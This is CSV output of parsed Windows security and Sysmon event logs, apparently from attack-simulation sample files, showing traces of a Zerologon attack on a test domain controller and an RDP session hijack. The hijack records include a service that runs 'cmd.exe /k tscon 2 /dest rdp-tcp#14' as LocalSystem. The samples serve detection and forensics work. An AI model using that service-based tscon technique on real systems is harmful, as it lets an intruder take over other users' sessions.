22,12157,2022-02-23 09:44:22.4511566,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2064,dc1.test.local,0,,Successful logon,-\-," (::1)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7E701E,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7E701E""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""51247""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
23,12158,2022-02-23 09:44:22.4519429,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,5280,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7E701E,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7E701E""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
24,12159,2022-02-23 09:44:28.5434622,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,636,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7E6A5C,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7E6A5C""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
25,12160,2022-02-23 09:45:04.8135563,4742,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,3580,dc1.test.local,0,,A computer account was changed,NT AUTHORITY\ANONYMOUS LOGON,,Target: TEST\DC1$,Changed Attribute SamAccountName: - DisplayName: - UserPrincipalName: - HomeDirectory: - HomePath: - ScriptPath: - ProfilePath: - UserWorkstations: - PasswordLastSet: 2022/02/23 18:45:04 AccountExpires: - PrimaryGroupId: - AllowedToDelegateTo: - OldUacValue: - NewUacValue: - UserAccountControl: - UserParameters: - SidHistory: - LogonHours: - DnsHostName: - ServicePrincipalNames: -,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""ComputerAccountChange"",""#text"":""-""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetSid"",""#text"":""S-1-5-21-3684832485-3471852018-3987709081-1000""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-7""},{""@Name"":""SubjectUserName"",""#text"":""ANONYMOUS LOGON""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E6""},{""@Name"":""PrivilegeList"",""#text"":""-""},{""@Name"":""SamAccountName"",""#text"":""-""},{""@Name"":""DisplayName"",""#text"":""-""},{""@Name"":""UserPrincipalName"",""#text"":""-""},{""@Name"":""HomeDirectory"",""#text"":""-""},{""@Name"":""HomePath"",""#text"":""-""},{""@Name"":""ScriptPath"",""#text"":""-""},{""@Name"":""ProfilePath"",""#text"":""-""},{""@Name"":""UserWorkstations"",""#text"":""-""},{""@Name"":""PasswordLastSet"",""#text"":""2022/02/23 18:45:04""},{""@Name"":""AccountExpires"",""#text"":""-""},{""@Name"":""PrimaryGroupId"",""#text"":""-""},{""@Name"":""AllowedToDelegateTo"",""#text"":""-""},{""@Name"":""OldUacValue"",""#text"":""-""},{""@Name"":""NewUacValue"",""#text"":""-""},{""@Name"":""UserAccountControl"",""#text"":""-""},{""@Name"":""UserParameters"",""#text"":""-""},{""@Name"":""SidHistory"",""#text"":""-""},{""@Name"":""LogonHours"",""#text"":""-""},{""@Name"":""DnsHostName"",""#text"":""-""},{""@Name"":""ServicePrincipalNames"",""#text"":""-""}]}}"
26,12161,2022-02-23 09:45:04.8186901,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2088,dc1.test.local,0,,A Kerberos service ticket was requested,,::1:0,Target: TEST.LOCAL\DC1$@TEST.LOCAL,ServiceName: DC1$,ServiceSid: S-1-5-21-3684832485-3471852018-3987709081-1000,TicketEncryptionType: AES256-CTS-HMAC-SHA1-96,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""DC1$@TEST.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""ServiceName"",""#text"":""DC1$""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-3684832485-3471852018-3987709081-1000""},{""@Name"":""TicketOptions"",""#text"":""0x40810000""},{""@Name"":""TicketEncryptionType"",""#text"":""0x12""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""0""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""0325d84c-41fc-7bb0-c7f0-91f3188c30e6""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
27,12162,2022-02-23 09:45:04.8197798,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2088,dc1.test.local,0,,A Kerberos service ticket was requested,,::1:0,Target: TEST.LOCAL\DC1$@TEST.LOCAL,ServiceName: DC1$,ServiceSid: S-1-5-21-3684832485-3471852018-3987709081-1000,TicketEncryptionType: AES256-CTS-HMAC-SHA1-96,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""DC1$@TEST.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""ServiceName"",""#text"":""DC1$""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-3684832485-3471852018-3987709081-1000""},{""@Name"":""TicketOptions"",""#text"":""0x40810000""},{""@Name"":""TicketEncryptionType"",""#text"":""0x12""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""0""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""0325d84c-41fc-7bb0-c7f0-91f3188c30e6""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
28,12163,2022-02-23 09:45:04.8250484,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2088,dc1.test.local,0,,A Kerberos service ticket was requested,,::1:0,Target: TEST.LOCAL\DC1$@TEST.LOCAL,ServiceName: DC1$,ServiceSid: S-1-5-21-3684832485-3471852018-3987709081-1000,TicketEncryptionType: AES256-CTS-HMAC-SHA1-96,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""DC1$@TEST.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""ServiceName"",""#text"":""DC1$""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-3684832485-3471852018-3987709081-1000""},{""@Name"":""TicketOptions"",""#text"":""0x40810000""},{""@Name"":""TicketEncryptionType"",""#text"":""0x12""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""0""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""0325d84c-41fc-7bb0-c7f0-91f3188c30e6""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
29,12164,2022-02-23 09:45:04.8272233,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2088,dc1.test.local,0,,A Kerberos service ticket was requested,,::1:0,Target: TEST.LOCAL\DC1$@TEST.LOCAL,ServiceName: DC1$,ServiceSid: S-1-5-21-3684832485-3471852018-3987709081-1000,TicketEncryptionType: AES256-CTS-HMAC-SHA1-96,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""DC1$@TEST.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""ServiceName"",""#text"":""DC1$""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-3684832485-3471852018-3987709081-1000""},{""@Name"":""TicketOptions"",""#text"":""0x40810000""},{""@Name"":""TicketEncryptionType"",""#text"":""0x12""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""0""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""0325d84c-41fc-7bb0-c7f0-91f3188c30e6""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
30,12165,2022-02-23 09:45:22.4510650,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7E8C31,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7E8C31""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
31,12166,2022-02-23 09:45:22.4511665,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,Successful logon,-\-," (::1)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7E8C31,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7E8C31""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""51252""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
32,12167,2022-02-23 09:45:22.4518882,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,3580,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7E8C31,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7E8C31""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
33,12168,2022-02-23 09:46:22.4513024,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2064,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7EF5DD,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7EF5DD""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
34,12169,2022-02-23 09:46:22.4513778,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2064,dc1.test.local,0,,Successful logon,-\-," (::1)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7EF5DD,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7EF5DD""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""51257""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
35,12170,2022-02-23 09:46:22.4521498,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,3580,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7EF5DD,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7EF5DD""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
1,284384,2022-02-08 20:33:10.9182672,4697,LogAlways,Microsoft-Windows-Security-Auditing,Security,596,5504,wef.windomain.local,0,,A service was installed on the system,WINDOMAIN\user,,ServiceName: rdphijack2,ServiceFileName: cmd.exe /k tscon 2 /dest rdp-tcp#14,ServiceType: Win32 Own Process,ServiceStartType: Manual,ServiceAccount: LocalSystem,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1563.002_RDP-Hijacking_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-2631427795-3543736937-124197156-1112""},{""@Name"":""SubjectUserName"",""#text"":""user""},{""@Name"":""SubjectDomainName"",""#text"":""WINDOMAIN""},{""@Name"":""SubjectLogonId"",""#text"":""0x1945C67""},{""@Name"":""ServiceName"",""#text"":""rdphijack2""},{""@Name"":""ServiceFileName"",""#text"":""cmd.exe /k tscon 2 /dest rdp-tcp#14""},{""@Name"":""ServiceType"",""#text"":""0x10""},{""@Name"":""ServiceStartType"",""#text"":""3""},{""@Name"":""ServiceAccount"",""#text"":""LocalSystem""}]}}"
2,284391,2022-02-08 20:33:15.1593875,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,6292,wef.windomain.local,0,,A new process has been created,WINDOMAIN\WEF$,,Parent process: C:\Windows\System32\services.exe,PID: 0x24C,Parent PID: 0x1980,Mandatory label: SECURITY_MANDATORY_SYSTEM_RID,Target User: -\-,,C:\Windows\System32\cmd.exe cmd.exe /k tscon 2 /dest rdp-tcp#14,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1563.002_RDP-Hijacking_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""WEF$""},{""@Name"":""SubjectDomainName"",""#text"":""WINDOMAIN""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""NewProcessId"",""#text"":""0x1980""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0x24C""},{""@Name"":""CommandLine"",""#text"":""cmd.exe /k tscon 2 /dest rdp-tcp#14""},{""@Name"":""TargetUserSid"",""#text"":""S-1-0-0""},{""@Name"":""TargetUserName"",""#text"":""-""},{""@Name"":""TargetDomainName"",""#text"":""-""},{""@Name"":""TargetLogonId"",""#text"":""0x0""},{""@Name"":""ParentProcessName"",""#text"":""C:\\Windows\\System32\\services.exe""},{""@Name"":""MandatoryLabel"",""#text"":""S-1-16-16384""}]}}"
3,284392,2022-02-08 20:33:15.1663418,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,6292,wef.windomain.local,0,,A new process has been created,WINDOMAIN\WEF$,,Parent process: C:\Windows\System32\cmd.exe,PID: 0x1980,Parent PID: 0x1B8C,Mandatory label: SECURITY_MANDATORY_SYSTEM_RID,Target User: -\-,,C:\Windows\System32\tscon.exe tscon  2 /dest rdp-tcp#14,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1563.002_RDP-Hijacking_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""WEF$""},{""@Name"":""SubjectDomainName"",""#text"":""WINDOMAIN""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""NewProcessId"",""#text"":""0x1B8C""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\tscon.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0x1980""},{""@Name"":""CommandLine"",""#text"":""tscon  2 /dest rdp-tcp#14""},{""@Name"":""TargetUserSid"",""#text"":""S-1-0-0""},{""@Name"":""TargetUserName"",""#text"":""-""},{""@Name"":""TargetDomainName"",""#text"":""-""},{""@Name"":""TargetLogonId"",""#text"":""0x0""},{""@Name"":""ParentProcessName"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""MandatoryLabel"",""#text"":""S-1-16-16384""}]}}"
4,284453,2022-02-08 20:33:21.2717627,4778,LogAlways,Microsoft-Windows-Security-Auditing,Security,596,1056,wef.windomain.local,0,,RDP reconnecting,WINDOMAIN\Administrator,DESKTOP-RKEBDDR (192.168.56.1),RDP-Tcp#14,,LogonId: 0x9DEB4D,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1563.002_RDP-Hijacking_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""AccountName"",""#text"":""Administrator""},{""@Name"":""AccountDomain"",""#text"":""WINDOMAIN""},{""@Name"":""LogonID"",""#text"":""0x9DEB4D""},{""@Name"":""SessionName"",""#text"":""RDP-Tcp#14""},{""@Name"":""ClientName"",""#text"":""DESKTOP-RKEBDDR""},{""@Name"":""ClientAddress"",""#text"":""192.168.56.1""}]}}"
1,1,2022-02-23 09:37:18.7996888,16,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2164,5836,dc1.test.local,0,S-1-5-21-3684832485-3471852018-3987709081-500,ServiceConfigurationChange,,,ConfigurationFileHash: -,,,,,,C:\Users\Administrator\Desktop\Sysmon\Sysmon64.exe  -accepteula -i,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:37:18.784""},{""@Name"":""Configuration"",""#text"":""C:\\Users\\Administrator\\Desktop\\Sysmon\\Sysmon64.exe  -accepteula -i""},{""@Name"":""ConfigurationFileHash"",""#text"":""-""}]}}"
2,2,2022-02-23 09:37:18.8489399,4,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Sysmon service state changed,,,Sysmon Version 13.33,Status: Started,Timestamp: 2022-02-23 09:37:18.847,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:37:18.847""},{""@Name"":""State"",""#text"":""Started""},{""@Name"":""Version"",""#text"":""13.33""},{""@Name"":""SchemaVersion"",""#text"":""4.81""}]}}"
3,3,2022-02-23 09:37:18.8583778,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 3224, ProcessGUID: 3b58b388-004e-6216-7001-000000000500",RuleName: -,SHA256=7ABCC0EDB4C0F9F47A1BAC0D06401504E1E91C4B1A4E679F01AD539F364D6881,ParentProcess: C:\Windows\System32\services.exe,"ParentProcessID: 592, ParentProcessGUID: 3b58b388-9e10-6213-0a00-000000000500",ParentCommandLine: C:\Windows\system32\services.exe,C:\Windows\Sysmon64.exe,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:37:18.808""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-004e-6216-7001-000000000500""},{""@Name"":""ProcessId"",""#text"":""3224""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Sysmon64.exe""},{""@Name"":""FileVersion"",""#text"":""13.33""},{""@Name"":""Description"",""#text"":""System activity monitor""},{""@Name"":""Product"",""#text"":""Sysinternals Sysmon""},{""@Name"":""Company"",""#text"":""Sysinternals - www.sysinternals.com""},{""@Name"":""OriginalFileName"",""#text"":""-""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\Sysmon64.exe""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""3b58b388-9e10-6213-e703-000000000000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""SHA256=7ABCC0EDB4C0F9F47A1BAC0D06401504E1E91C4B1A4E679F01AD539F364D6881""},{""@Name"":""ParentProcessGuid"",""#text"":""3b58b388-9e10-6213-0a00-000000000500""},{""@Name"":""ParentProcessId"",""#text"":""592""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\services.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\services.exe""},{""@Name"":""ParentUser"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
4,4,2022-02-23 09:37:18.8588631,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 608, ProcessGUID: 3b58b388-004e-6216-7101-000000000500",RuleName: -,SHA256=1D61DD5E920F13D3280B8FFC40BB0C6164D29CAF2220BF526933177D050FC379,ParentProcess: C:\Windows\System32\svchost.exe,"ParentProcessID: 784, ParentProcessGUID: 3b58b388-9e11-6213-0c00-000000000500",ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch,C:\Windows\system32\wbem\unsecapp.exe -Embedding,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:37:18.831""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-004e-6216-7101-000000000500""},{""@Name"":""ProcessId"",""#text"":""608""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\wbem\\unsecapp.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.14393.0 (rs1_release.160715-1616)""},{""@Name"":""Description"",""#text"":""Sink to receive asynchronous callbacks for WMI client application""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""unsecapp.dll""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\system32\\wbem\\unsecapp.exe -Embedding""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""NT 